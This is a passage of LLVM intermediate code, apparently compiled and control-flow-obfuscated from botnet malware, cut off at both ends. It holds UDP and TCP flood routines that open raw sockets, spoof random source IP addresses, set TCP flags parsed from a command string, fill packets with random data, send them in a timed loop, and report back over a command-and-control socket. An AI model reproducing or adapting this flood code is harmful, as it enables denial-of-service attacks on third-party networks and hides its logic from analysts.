  %167 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %168 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %169 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %168, i32 0, i32 0
  %170 = load i32, i32* %169, align 4
  %171 = load i32, i32* %22, align 4
  %172 = call i32 @getRandomIP(i32 %171)
  %173 = call i32 @htonl(i32 %172) #13
  %174 = load i32, i32* %11, align 4
  %175 = sext i32 %174 to i64
  %176 = add i64 8, %175
  %177 = trunc i64 %176 to i32
  call void @makeIPPacket(%struct.iphdr* %167, i32 %170, i32 %173, i8 zeroext 17, i32 %177)
  %178 = load i32, i32* %11, align 4
  %179 = sext i32 %178 to i64
  %180 = add i64 8, %179
  %181 = trunc i64 %180 to i16
  %182 = call zeroext i16 @htons(i16 zeroext %181) #13
  %183 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %184 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %183, i32 0, i32 0
  %185 = bitcast %union.anon.3* %184 to %struct.anon.4*
  %186 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %185, i32 0, i32 2
  store i16 %182, i16* %186, align 2
  %187 = call i32 @rand_cmwc()
  %188 = trunc i32 %187 to i16
  %189 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %190 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %189, i32 0, i32 0
  %191 = bitcast %union.anon.3* %190 to %struct.anon.4*
  %192 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %191, i32 0, i32 0
  store i16 %188, i16* %192, align 2
  %193 = load i32, i32* %8, align 4
  %194 = icmp eq i32 %193, 0
  %195 = select i1 %194, i32 1415005238, i32 1260044114
  store i32 %195, i32* %switchVar
  br label %loopEnd

; <label>:196:                                    ; preds = %loopEntry
  %197 = call i32 @rand_cmwc()
  store i32 -761977493, i32* %switchVar
  store i32 %197, i32* %.reg2mem10
  br label %loopEnd

; <label>:198:                                    ; preds = %loopEntry
  %199 = load i32, i32* %8, align 4
  %200 = trunc i32 %199 to i16
  %201 = call zeroext i16 @htons(i16 zeroext %200) #13
  %202 = zext i16 %201 to i32
  store i32 -761977493, i32* %switchVar
  store i32 %202, i32* %.reg2mem10
  br label %loopEnd

; <label>:203:                                    ; preds = %loopEntry
  %.reload11 = load i32, i32* %.reg2mem10
  %204 = trunc i32 %.reload11 to i16
  %205 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %206 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %205, i32 0, i32 0
  %207 = bitcast %union.anon.3* %206 to %struct.anon.4*
  %208 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %207, i32 0, i32 1
  store i16 %204, i16* %208, align 2
  %209 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %210 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %209, i32 0, i32 0
  %211 = bitcast %union.anon.3* %210 to %struct.anon.4*
  %212 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %211, i32 0, i32 3
  store i16 0, i16* %212, align 2
  %213 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %214 = bitcast %struct.udphdr* %213 to i8*
  %215 = getelementptr inbounds i8, i8* %214, i64 8
  %216 = load i32, i32* %11, align 4
  call void @makeRandomStr(i8* %215, i32 %216)
  %.reload8 = load volatile i8*, i8** %.reg2mem5
  %217 = bitcast i8* %.reload8 to i16*
  %218 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %219 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %218, i32 0, i32 2
  %220 = load i16, i16* %219, align 2
  %221 = zext i16 %220 to i32
  %222 = call zeroext i16 @csum(i16* %217, i32 %221)
  %223 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %224 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %223, i32 0, i32 7
  store i16 %222, i16* %224, align 2
  %225 = call i64 @time(i64* null) #2
  %226 = load i32, i32* %9, align 4
  %227 = sext i32 %226 to i64
  %228 = add nsw i64 %225, %227
  %229 = trunc i64 %228 to i32
  store i32 %229, i32* %26, align 4
  store i32 0, i32* %27, align 4
  store i32 467071504, i32* %switchVar
  br label %loopEnd

; <label>:230:                                    ; preds = %loopEntry
  store i32 1918113792, i32* %switchVar
  br label %loopEnd

; <label>:231:                                    ; preds = %loopEntry
  %232 = load i32, i32* %19, align 4
  %233 = bitcast %struct.sockaddr_in* %13 to %struct.sockaddr*
  %.reload3 = load volatile i64, i64* %.reg2mem2
  %.reload7 = load volatile i8*, i8** %.reg2mem5
  %234 = call i64 @sendto(i32 %232, i8* %.reload7, i64 %.reload3, i32 0, %struct.sockaddr* %233, i32 16)
  %235 = call i32 @rand_cmwc()
  %236 = trunc i32 %235 to i16
  %237 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %238 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %237, i32 0, i32 0
  %239 = bitcast %union.anon.3* %238 to %struct.anon.4*
  %240 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %239, i32 0, i32 0
  store i16 %236, i16* %240, align 2
  %241 = load i32, i32* %8, align 4
  %242 = icmp eq i32 %241, 0
  %243 = select i1 %242, i32 438423565, i32 110703534
  store i32 %243, i32* %switchVar
  br label %loopEnd

; <label>:244:                                    ; preds = %loopEntry
  %245 = call i32 @rand_cmwc()
  store i32 1984792165, i32* %switchVar
  store i32 %245, i32* %.reg2mem12
  br label %loopEnd

; <label>:246:                                    ; preds = %loopEntry
  %247 = load i32, i32* %8, align 4
  %248 = trunc i32 %247 to i16
  %249 = call zeroext i16 @htons(i16 zeroext %248) #13
  %250 = zext i16 %249 to i32
  store i32 1984792165, i32* %switchVar
  store i32 %250, i32* %.reg2mem12
  br label %loopEnd

; <label>:251:                                    ; preds = %loopEntry
  %.reload13 = load i32, i32* %.reg2mem12
  %252 = trunc i32 %.reload13 to i16
  %253 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %254 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %253, i32 0, i32 0
  %255 = bitcast %union.anon.3* %254 to %struct.anon.4*
  %256 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %255, i32 0, i32 1
  store i16 %252, i16* %256, align 2
  %257 = call i32 @rand_cmwc()
  %258 = trunc i32 %257 to i16
  %259 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %260 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %259, i32 0, i32 3
  store i16 %258, i16* %260, align 4
  %261 = load i32, i32* %22, align 4
  %262 = call i32 @getRandomIP(i32 %261)
  %263 = call i32 @htonl(i32 %262) #13
  %264 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %265 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %264, i32 0, i32 8
  store i32 %263, i32* %265, align 4
  %.reload6 = load volatile i8*, i8** %.reg2mem5
  %266 = bitcast i8* %.reload6 to i16*
  %267 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %268 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %267, i32 0, i32 2
  %269 = load i16, i16* %268, align 2
  %270 = zext i16 %269 to i32
  %271 = call zeroext i16 @csum(i16* %266, i32 %270)
  %272 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %273 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %272, i32 0, i32 7
  store i16 %271, i16* %273, align 2
  %274 = load i32, i32* %27, align 4
  %275 = load i32, i32* %14, align 4
  %276 = icmp eq i32 %274, %275
  %277 = select i1 %276, i32 -397420237, i32 -1212522295
  store i32 %277, i32* %switchVar
  br label %loopEnd

; <label>:278:                                    ; preds = %loopEntry
  %279 = call i64 @time(i64* null) #2
  %280 = load i32, i32* %26, align 4
  %281 = sext i32 %280 to i64
  %282 = icmp sgt i64 %279, %281
  %283 = select i1 %282, i32 1757766816, i32 1024569948
  store i32 %283, i32* %switchVar
  br label %loopEnd

; <label>:284:                                    ; preds = %loopEntry
  store i32 1237001243, i32* %switchVar
  br label %loopEnd

; <label>:285:                                    ; preds = %loopEntry
  store i32 0, i32* %27, align 4
  store i32 467071504, i32* %switchVar
  br label %loopEnd

; <label>:286:                                    ; preds = %loopEntry
  %287 = load i32, i32* %27, align 4
  %288 = add i32 %287, 1
  store i32 %288, i32* %27, align 4
  store i32 467071504, i32* %switchVar
  br label %loopEnd

; <label>:289:                                    ; preds = %loopEntry
  %290 = load i8*, i8** %23, align 8
  call void @llvm.stackrestore(i8* %290)
  store i32 -795663293, i32* %switchVar
  br label %loopEnd

; <label>:291:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %289, %286, %285, %284, %278, %251, %246, %244, %231, %230, %203, %198, %196, %156, %150, %149, %145, %138, %133, %132, %129, %123, %120, %115, %114, %111, %110, %109, %103, %99, %95, %84, %72, %71, %63, %60, %55, %48, %47, %41, %36, %32, %first, %switchDefault
  br label %loopEntry
}

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #3

; Function Attrs: nounwind
declare void @srand(i32) #4

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #8

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #2

; Function Attrs: noinline nounwind uwtable
define void @sendTCP(i8*, i32, i32, i32, i8*, i32, i32) #0 {
  %.reg2mem5 = alloca i8*
  %.reg2mem2 = alloca i64
  %.reg2mem = alloca i32
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca %struct.iphdr*, align 8
  %22 = alloca %struct.tcphdr*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  store i8* %0, i8** %8, align 8
  store i32 %1, i32* %9, align 4
  store i32 %2, i32* %10, align 4
  store i32 %3, i32* %11, align 4
  store i8* %4, i8** %12, align 8
  store i32 %5, i32* %13, align 4
  store i32 %6, i32* %14, align 4
  %26 = load i32, i32* %14, align 4
  store i32 %26, i32* %15, align 4
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %9, align 4
  store i32 %28, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 175705810, i32* %switchVar
  %.reg2mem10 = alloca i32
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %7
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 175705810, label %first
    i32 1856901696, label %31
    i32 -2064326358, label %35
    i32 -1323204973, label %40
    i32 885768843, label %46
    i32 255529203, label %47
    i32 1016289750, label %54
    i32 -1909341660, label %57
    i32 -1748510991, label %63
    i32 1539805954, label %66
    i32 -142651477, label %70
    i32 -1468019060, label %71
    i32 -1876095138, label %77
    i32 1109787539, label %125
    i32 -1958813523, label %161
    i32 1439810973, label %164
    i32 714683789, label %168
    i32 -460917346, label %173
    i32 506509775, label %181
    i32 -1573141429, label %186
    i32 1890345905, label %194
    i32 1048743498, label %199
    i32 2022657897, label %207
    i32 210211832, label %212
    i32 -151694201, label %220
    i32 475203966, label %225
    i32 612983256, label %233
    i32 -617087869, label %237
    i32 706395077, label %238
    i32 -798001665, label %239
    i32 -1692288821, label %240
    i32 -611181699, label %241
    i32 -321724367, label %243
    i32 -448821937, label %244
    i32 584570779, label %262
    i32 1842324547, label %264
    i32 358687856, label %269
    i32 347368866, label %295
    i32 1270608715, label %296
    i32 160118851, label %343
    i32 -1991793674, label %349
    i32 -1895381133, label %350
    i32 -604030924, label %351
    i32 1852483953, label %354
    i32 683644618, label %356
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %29 = icmp eq i32 %.reload, 0
  %30 = select i1 %29, i32 1856901696, i32 -2064326358
  store i32 %30, i32* %switchVar
  br label %loopEnd

; <label>:31:                                     ; preds = %loopEntry
  %32 = call i32 @rand_cmwc()
  %33 = trunc i32 %32 to i16
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %33, i16* %34, align 2
  store i32 -1323204973, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  %36 = load i32, i32* %9, align 4
  %37 = trunc i32 %36 to i16
  %38 = call zeroext i16 @htons(i16 zeroext %37) #13
  %39 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %38, i16* %39, align 2
  store i32 -1323204973, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = load i8*, i8** %8, align 8
  %42 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %43 = call i32 @getHost(i8* %41, %struct.in_addr* %42)
  %44 = icmp ne i32 %43, 0
  %45 = select i1 %44, i32 885768843, i32 255529203
  store i32 %45, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  store i32 683644618, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  %48 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 3
  %49 = getelementptr inbounds [8 x i8], [8 x i8]* %48, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %49, i8 0, i64 8, i32 4, i1 false)
  %50 = call i32 @socket(i32 2, i32 3, i32 6) #2
  store i32 %50, i32* %17, align 4
  %51 = load i32, i32* %17, align 4
  %52 = icmp ne i32 %51, 0
  %53 = select i1 %52, i32 -1909341660, i32 1016289750
  store i32 %53, i32* %switchVar
  br label %loopEnd

; <label>:54:                                     ; preds = %loopEntry
  %55 = load i32, i32* @mainCommSock, align 4
  %56 = call i32 (i32, i8*, ...) @sockprintf(i32 %55, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.82, i32 0, i32 0))
  store i32 683644618, i32* %switchVar
  br label %loopEnd

; <label>:57:                                     ; preds = %loopEntry
  store i32 1, i32* %18, align 4
  %58 = load i32, i32* %17, align 4
  %59 = bitcast i32* %18 to i8*
  %60 = call i32 @setsockopt(i32 %58, i32 0, i32 3, i8* %59, i32 4) #2
  %61 = icmp slt i32 %60, 0
  %62 = select i1 %61, i32 -1748510991, i32 1539805954
  store i32 %62, i32* %switchVar
  br label %loopEnd

; <label>:63:                                     ; preds = %loopEntry
  %64 = load i32, i32* @mainCommSock, align 4
  %65 = call i32 (i32, i8*, ...) @sockprintf(i32 %64, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.83, i32 0, i32 0))
  store i32 683644618, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  %67 = load i32, i32* %11, align 4
  %68 = icmp eq i32 %67, 0
  %69 = select i1 %68, i32 -142651477, i32 -1468019060
  store i32 %69, i32* %switchVar
  br label %loopEnd

; <label>:70:                                     ; preds = %loopEntry
  store i32 0, i32* %19, align 4
  store i32 -1876095138, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  %72 = load i32, i32* %11, align 4
  %73 = sub nsw i32 32, %72
  %74 = shl i32 1, %73
  %75 = sub nsw i32 %74, 1
  %76 = xor i32 %75, -1
  store i32 %76, i32* %19, align 4
  store i32 -1876095138, i32* %switchVar
  br label %loopEnd

; <label>:77:                                     ; preds = %loopEntry
  %78 = load i32, i32* %13, align 4
  %79 = sext i32 %78 to i64
  %80 = add i64 40, %79
  store i64 %80, i64* %.reg2mem2
  %81 = call i8* @llvm.stacksave()
  store i8* %81, i8** %20, align 8
  %.reload4 = load volatile i64, i64* %.reg2mem2
  %82 = alloca i8, i64 %.reload4, align 16
  store i8* %82, i8** %.reg2mem5
  %.reload9 = load volatile i8*, i8** %.reg2mem5
  %83 = bitcast i8* %.reload9 to %struct.iphdr*
  store %struct.iphdr* %83, %struct.iphdr** %21, align 8
  %84 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %85 = bitcast %struct.iphdr* %84 to i8*
  %86 = getelementptr i8, i8* %85, i64 20
  %87 = bitcast i8* %86 to %struct.tcphdr*
  store %struct.tcphdr* %87, %struct.tcphdr** %22, align 8
  %88 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %89 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %90 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %89, i32 0, i32 0
  %91 = load i32, i32* %90, align 4
  %92 = load i32, i32* %19, align 4
  %93 = call i32 @getRandomIP(i32 %92)
  %94 = call i32 @htonl(i32 %93) #13
  %95 = load i32, i32* %13, align 4
  %96 = sext i32 %95 to i64
  %97 = add i64 20, %96
  %98 = trunc i64 %97 to i32
  call void @makeIPPacket(%struct.iphdr* %88, i32 %91, i32 %94, i8 zeroext 6, i32 %98)
  %99 = call i32 @rand_cmwc()
  %100 = trunc i32 %99 to i16
  %101 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %102 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %101, i32 0, i32 0
  %103 = bitcast %union.anon.0* %102 to %struct.anon.1*
  %104 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %103, i32 0, i32 0
  store i16 %100, i16* %104, align 4
  %105 = call i32 @rand_cmwc()
  %106 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %107 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %106, i32 0, i32 0
  %108 = bitcast %union.anon.0* %107 to %struct.anon.1*
  %109 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %108, i32 0, i32 2
  store i32 %105, i32* %109, align 4
  %110 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %111 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %110, i32 0, i32 0
  %112 = bitcast %union.anon.0* %111 to %struct.anon.1*
  %113 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %112, i32 0, i32 3
  store i32 0, i32* %113, align 4
  %114 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %115 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %114, i32 0, i32 0
  %116 = bitcast %union.anon.0* %115 to %struct.anon.1*
  %117 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %116, i32 0, i32 4
  %118 = load i16, i16* %117, align 4
  %119 = and i16 %118, -241
  %120 = or i16 %119, 80
  store i16 %120, i16* %117, align 4
  %121 = load i8*, i8** %12, align 8
  %122 = call i32 @strcmp(i8* %121, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.84, i32 0, i32 0)) #10
  %123 = icmp ne i32 %122, 0
  %124 = select i1 %123, i32 -1958813523, i32 1109787539
  store i32 %124, i32* %switchVar
  br label %loopEnd

; <label>:125:                                    ; preds = %loopEntry
  %126 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %127 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %126, i32 0, i32 0
  %128 = bitcast %union.anon.0* %127 to %struct.anon.1*
  %129 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %128, i32 0, i32 4
  %130 = load i16, i16* %129, align 4
  %131 = and i16 %130, -513
  %132 = or i16 %131, 512
  store i16 %132, i16* %129, align 4
  %133 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %134 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %133, i32 0, i32 0
  %135 = bitcast %union.anon.0* %134 to %struct.anon.1*
  %136 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %135, i32 0, i32 4
  %137 = load i16, i16* %136, align 4
  %138 = and i16 %137, -1025
  %139 = or i16 %138, 1024
  store i16 %139, i16* %136, align 4
  %140 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %141 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %140, i32 0, i32 0
  %142 = bitcast %union.anon.0* %141 to %struct.anon.1*
  %143 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %142, i32 0, i32 4
  %144 = load i16, i16* %143, align 4
  %145 = and i16 %144, -257
  %146 = or i16 %145, 256
  store i16 %146, i16* %143, align 4
  %147 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %148 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %147, i32 0, i32 0
  %149 = bitcast %union.anon.0* %148 to %struct.anon.1*
  %150 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %149, i32 0, i32 4
  %151 = load i16, i16* %150, align 4
  %152 = and i16 %151, -4097
  %153 = or i16 %152, 4096
  store i16 %153, i16* %150, align 4
  %154 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %155 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %154, i32 0, i32 0
  %156 = bitcast %union.anon.0* %155 to %struct.anon.1*
  %157 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %156, i32 0, i32 4
  %158 = load i16, i16* %157, align 4
  %159 = and i16 %158, -2049
  %160 = or i16 %159, 2048
  store i16 %160, i16* %157, align 4
  store i32 -448821937, i32* %switchVar
  br label %loopEnd

; <label>:161:                                    ; preds = %loopEntry
  %162 = load i8*, i8** %12, align 8
  %163 = call i8* @strtok(i8* %162, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.85, i32 0, i32 0)) #2
  store i8* %163, i8** %23, align 8
  store i32 1439810973, i32* %switchVar
  br label %loopEnd

; <label>:164:                                    ; preds = %loopEntry
  %165 = load i8*, i8** %23, align 8
  %166 = icmp ne i8* %165, null
  %167 = select i1 %166, i32 714683789, i32 -321724367
  store i32 %167, i32* %switchVar
  br label %loopEnd

; <label>:168:                                    ; preds = %loopEntry
  %169 = load i8*, i8** %23, align 8
  %170 = call i32 @strcmp(i8* %169, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.86, i32 0, i32 0)) #10
  %171 = icmp ne i32 %170, 0
  %172 = select i1 %171, i32 506509775, i32 -460917346
  store i32 %172, i32* %switchVar
  br label %loopEnd

; <label>:173:                                    ; preds = %loopEntry
  %174 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %175 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %174, i32 0, i32 0
  %176 = bitcast %union.anon.0* %175 to %struct.anon.1*
  %177 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %176, i32 0, i32 4
  %178 = load i16, i16* %177, align 4
  %179 = and i16 %178, -513
  %180 = or i16 %179, 512
  store i16 %180, i16* %177, align 4
  store i32 -611181699, i32* %switchVar
  br label %loopEnd

; <label>:181:                                    ; preds = %loopEntry
  %182 = load i8*, i8** %23, align 8
  %183 = call i32 @strcmp(i8* %182, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.87, i32 0, i32 0)) #10
  %184 = icmp ne i32 %183, 0
  %185 = select i1 %184, i32 1890345905, i32 -1573141429
  store i32 %185, i32* %switchVar
  br label %loopEnd

; <label>:186:                                    ; preds = %loopEntry
  %187 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %188 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %187, i32 0, i32 0
  %189 = bitcast %union.anon.0* %188 to %struct.anon.1*
  %190 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %189, i32 0, i32 4
  %191 = load i16, i16* %190, align 4
  %192 = and i16 %191, -1025
  %193 = or i16 %192, 1024
  store i16 %193, i16* %190, align 4
  store i32 -1692288821, i32* %switchVar
  br label %loopEnd

; <label>:194:                                    ; preds = %loopEntry
  %195 = load i8*, i8** %23, align 8
  %196 = call i32 @strcmp(i8* %195, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.88, i32 0, i32 0)) #10
  %197 = icmp ne i32 %196, 0
  %198 = select i1 %197, i32 2022657897, i32 1048743498
  store i32 %198, i32* %switchVar
  br label %loopEnd

; <label>:199:                                    ; preds = %loopEntry
  %200 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %201 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %200, i32 0, i32 0
  %202 = bitcast %union.anon.0* %201 to %struct.anon.1*
  %203 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %202, i32 0, i32 4
  %204 = load i16, i16* %203, align 4
  %205 = and i16 %204, -257
  %206 = or i16 %205, 256
  store i16 %206, i16* %203, align 4
  store i32 -798001665, i32* %switchVar
  br label %loopEnd

; <label>:207:                                    ; preds = %loopEntry
  %208 = load i8*, i8** %23, align 8
  %209 = call i32 @strcmp(i8* %208, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.89, i32 0, i32 0)) #10
  %210 = icmp ne i32 %209, 0
  %211 = select i1 %210, i32 -151694201, i32 210211832
  store i32 %211, i32* %switchVar
  br label %loopEnd

; <label>:212:                                    ; preds = %loopEntry
  %213 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %214 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %213, i32 0, i32 0
  %215 = bitcast %union.anon.0* %214 to %struct.anon.1*
  %216 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %215, i32 0, i32 4
  %217 = load i16, i16* %216, align 4
  %218 = and i16 %217, -4097
  %219 = or i16 %218, 4096
  store i16 %219, i16* %216, align 4
  store i32 706395077, i32* %switchVar
  br label %loopEnd

; <label>:220:                                    ; preds = %loopEntry
  %221 = load i8*, i8** %23, align 8
  %222 = call i32 @strcmp(i8* %221, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.90, i32 0, i32 0)) #10
  %223 = icmp ne i32 %222, 0
  %224 = select i1 %223, i32 612983256, i32 475203966
  store i32 %224, i32* %switchVar
  br label %loopEnd

; <label>:225:                                    ; preds = %loopEntry
  %226 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %227 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %226, i32 0, i32 0
  %228 = bitcast %union.anon.0* %227 to %struct.anon.1*
  %229 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %228, i32 0, i32 4
  %230 = load i16, i16* %229, align 4
  %231 = and i16 %230, -2049
  %232 = or i16 %231, 2048
  store i16 %232, i16* %229, align 4
  store i32 -617087869, i32* %switchVar
  br label %loopEnd

; <label>:233:                                    ; preds = %loopEntry
  %234 = load i32, i32* @mainCommSock, align 4
  %235 = load i8*, i8** %23, align 8
  %236 = call i32 (i32, i8*, ...) @sockprintf(i32 %234, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.91, i32 0, i32 0), i8* %235)
  store i32 -617087869, i32* %switchVar
  br label %loopEnd

; <label>:237:                                    ; preds = %loopEntry
  store i32 706395077, i32* %switchVar
  br label %loopEnd

; <label>:238:                                    ; preds = %loopEntry
  store i32 -798001665, i32* %switchVar
  br label %loopEnd

; <label>:239:                                    ; preds = %loopEntry
  store i32 -1692288821, i32* %switchVar
  br label %loopEnd

; <label>:240:                                    ; preds = %loopEntry
  store i32 -611181699, i32* %switchVar
  br label %loopEnd

; <label>:241:                                    ; preds = %loopEntry
  %242 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.85, i32 0, i32 0)) #2
  store i8* %242, i8** %23, align 8
  store i32 1439810973, i32* %switchVar
  br label %loopEnd

; <label>:243:                                    ; preds = %loopEntry
  store i32 -448821937, i32* %switchVar
  br label %loopEnd

; <label>:244:                                    ; preds = %loopEntry
  %245 = call i32 @rand_cmwc()
  %246 = trunc i32 %245 to i16
  %247 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %248 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %247, i32 0, i32 0
  %249 = bitcast %union.anon.0* %248 to %struct.anon.1*
  %250 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %249, i32 0, i32 5
  store i16 %246, i16* %250, align 2
  %251 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %252 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %251, i32 0, i32 0
  %253 = bitcast %union.anon.0* %252 to %struct.anon.1*
  %254 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %253, i32 0, i32 6
  store i16 0, i16* %254, align 4
  %255 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %256 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %255, i32 0, i32 0
  %257 = bitcast %union.anon.0* %256 to %struct.anon.1*
  %258 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %257, i32 0, i32 7
  store i16 0, i16* %258, align 2
  %259 = load i32, i32* %9, align 4
  %260 = icmp eq i32 %259, 0
  %261 = select i1 %260, i32 584570779, i32 1842324547
  store i32 %261, i32* %switchVar
  br label %loopEnd

; <label>:262:                                    ; preds = %loopEntry
  %263 = call i32 @rand_cmwc()
  store i32 358687856, i32* %switchVar
  store i32 %263, i32* %.reg2mem10
  br label %loopEnd

; <label>:264:                                    ; preds = %loopEntry
  %265 = load i32, i32* %9, align 4
  %266 = trunc i32 %265 to i16
  %267 = call zeroext i16 @htons(i16 zeroext %266) #13
  %268 = zext i16 %267 to i32
  store i32 358687856, i32* %switchVar
  store i32 %268, i32* %.reg2mem10
  br label %loopEnd

; <label>:269:                                    ; preds = %loopEntry
  %.reload11 = load i32, i32* %.reg2mem10
  %270 = trunc i32 %.reload11 to i16
  %271 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
